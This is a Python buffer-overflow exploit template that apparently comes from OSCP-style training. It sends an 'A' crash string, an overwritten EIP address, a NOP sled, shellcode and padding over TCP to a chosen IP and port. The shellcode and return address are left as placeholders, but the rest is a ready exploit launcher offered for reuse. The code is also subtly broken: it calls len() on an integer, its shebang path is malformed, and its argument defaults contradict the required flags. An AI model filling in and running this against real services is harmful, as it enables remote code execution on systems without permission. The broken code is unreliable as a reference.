#!usr/bin/env python

# Author: Tyler Bennett
# taken from various sources online and offsec
# I just wanted to make it less patch-work

from __future__ import print_function

import sys
import socket
import argparse

class colors:
    reset='\033[0m'
    class fg:
        red='\033[31m'
        green='\033[32m'
        purple='\033[35m'
        cyan='\033[36m'
    class bg:
        black='\033[40m'

def fatal(arg, prefix='[!] '):
    print(colors.bg.black, colors.fg.red, prefix+arg, colors.reset)

def info(arg, prefix="[*] "):
    print(colors.bg.black, colors.fg.cyan, prefix+arg, colors.reset)

def console(arg, prefix="[*] "):
    print(colors.bg.black, colors.fg.green, prefix+arg, colors.reset)

shellcode =  ""
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"
shellcode += "................................................"

eip = "\x00\x00\x00\x00"

def fuzz(args):
    assert shellcode != "." * (48*17), fatal("Shellcode must be set prior to run")
    assert eip != "\x00\x00\x00\x00", fatal("EIP must be set prior to run")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    crash = "A" * args.crash
    nop = "\x90" * args.nop
    payload = (len(crash) + len(eip) + len(nop) + len(shellcode))
    padding = "C" * (args.length - payload)
    string = crash + eip + nop + shellcode + padding

    try:
        info("Fuzzing buffer with %s bytes" % args.crash)
        info("Total payload size: %s bytes" % len(payload))
        info("Total package size: %s bytes" % len(string))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _ = s.connect((args.address,args.port))
        s.send(string + '\r\n')
        console("Success?!?", "[+] ")
        s.close()
        sys.exit(0)
    except socket.error as e:
        fatal("%s : %d " %  (e.strerror, e.errno))
        fatal("Check your target. Is system shunning us?")
        sys.exit(1)
    except Exception as e:
        raise

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-p','--port',required=True,type=int,help='port to fuzz')
    parser.add_argument('-ip','--address',required=True,help='IP Address to attack.  Default is 127.0.0.1',default='127.0.0.1')
    parser.add_argument('-c','--crash',required=True,type=int,help='Exact number of bytes to crash application; you should provide len(A), (A+):(EIP):(badchars)')
    parser.add_argument('-l','--length',required=True,type=int,help='Length of payload to send, provided number should be > (crash+eip+nop+shellcode), padding will be calculated. default=1000',default=1000)
    parser.add_argument('-n','--nop',required=True,type=int,help='Number of NOPs to send, default is 60', default=60)
    args = parser.parse_args()
    fuzz(args)

if __name__=="__main__":
    main()
